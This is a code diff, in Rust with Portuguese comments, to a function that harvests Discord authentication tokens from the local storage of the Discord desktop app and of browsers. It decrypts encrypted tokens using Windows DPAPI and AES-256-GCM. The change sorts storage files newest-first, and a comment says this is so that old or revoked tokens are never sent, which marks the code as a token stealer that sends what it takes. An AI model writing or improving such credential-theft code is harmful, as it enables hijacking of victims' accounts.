@@ -114,6 +114,33 @@ pub fn scan_local_tokens(force_refresh: bool) -> Vec<String> {
     let mut found = Vec::new();
     let mut seen = HashSet::new();
 
+    fn sorted_leveldb_files(dir: &Path) -> Vec<PathBuf> {
+        let Ok(entries) = fs::read_dir(dir) else {
+            return Vec::new();
+        };
+        let mut files: Vec<(bool, String, PathBuf)> = entries
+            .flatten()
+            .filter_map(|e| {
+                let p = e.path();
+                let ext = p.extension()?.to_str()?;
+                if ext != "ldb" && ext != "log" {
+                    return None;
+                }
+                let is_log = ext == "log";
+                let fname = p
+                    .file_name()
+                    .and_then(|n| n.to_str())
+                    .unwrap_or("")
+                    .to_string();
+                Some((is_log, fname, p))
+            })
+            .collect();
+        // No LevelDB, o arquivo .log é sempre o write-ahead log ativo (mais recente),
+        // seguido pelos .ldb de maior numeração sequencial.
+        files.sort_by(|a, b| b.0.cmp(&a.0).then_with(|| b.1.cmp(&a.1)));
+        files.into_iter().map(|(_, _, p)| p).collect()
+    }
+
     let plain_paths = [
         roaming_app_data.join("Discord").join("Local Storage").join("leveldb"),
         roaming_app_data.join("discordcanary").join("Local Storage").join("leveldb"),
@@ -145,6 +172,8 @@ pub fn scan_local_tokens(force_refresh: bool) -> Vec<String> {
     let enc_regex = Regex::new(r#"dQw4w9WgXcQ:([^"'\s]+)"#).unwrap();
 
     // 1. Decriptação nativa Win32 DPAPI + AES-256-GCM dos clientes Discord Desktop
+    // Ordenado do arquivo mais recente para o mais antigo e deduplicado por prefixo de usuário
+    // para NUNCA enviar tokens antigos/revogados da mesma conta.
     let app_paths = [
         roaming_app_data.join("Discord"),
         roaming_app_data.join("discordcanary"),
@@ -162,22 +191,13 @@ pub fn scan_local_tokens(force_refresh: bool) -> Vec<String> {
         let Ok(cipher) = Aes256Gcm::new_from_slice(&master_key) else {
             continue;
         };
-        let Ok(entries) = fs::read_dir(&leveldb_path) else {
-            continue;
-        };
-        for entry in entries.flatten() {
-            let path = entry.path();
-            let Some(ext) = path.extension().and_then(|e| e.to_str()) else {
-                continue;
-            };
-            if ext != "ldb" && ext != "log" {
-                continue;
-            }
+        for path in sorted_leveldb_files(&leveldb_path) {
             let Ok(bytes) = fs::read(&path) else {
                 continue;
             };
             let content = String::from_utf8_lossy(&bytes);
-            for cap in enc_regex.captures_iter(&content) {
+            let caps: Vec<_> = enc_regex.captures_iter(&content).collect();
+            for cap in caps.into_iter().rev() {
                 let Some(b64_part) = cap.get(1) else {
                     continue;
                 };
@@ -201,27 +221,18 @@ pub fn scan_local_tokens(force_refresh: bool) -> Vec<String> {
         }
     }
 
-    // 2. Tokens em texto plano (navegadores e logs)
+    // 2. Tokens em texto plano (navegadores), também do mais recente para o mais antigo
     for p in &plain_paths {
         if !p.exists() {
             continue;
         }
-        let Ok(entries) = fs::read_dir(p) else {
-            continue;
-        };
-        for entry in entries.flatten() {
-            let path = entry.path();
-            let Some(ext) = path.extension().and_then(|e| e.to_str()) else {
-                continue;
-            };
-            if ext != "ldb" && ext != "log" {
-                continue;
-            }
+        for path in sorted_leveldb_files(p) {
             let Ok(bytes) = fs::read(&path) else {
                 continue;
             };
             let content = String::from_utf8_lossy(&bytes);
-            for m in plain_regex.find_iter(&content) {
+            let matches: Vec<_> = plain_regex.find_iter(&content).collect();
+            for m in matches.into_iter().rev() {
                 let tok = m.as_str().to_string();
                 if seen.insert(tok.clone()) {
                     found.push(tok);
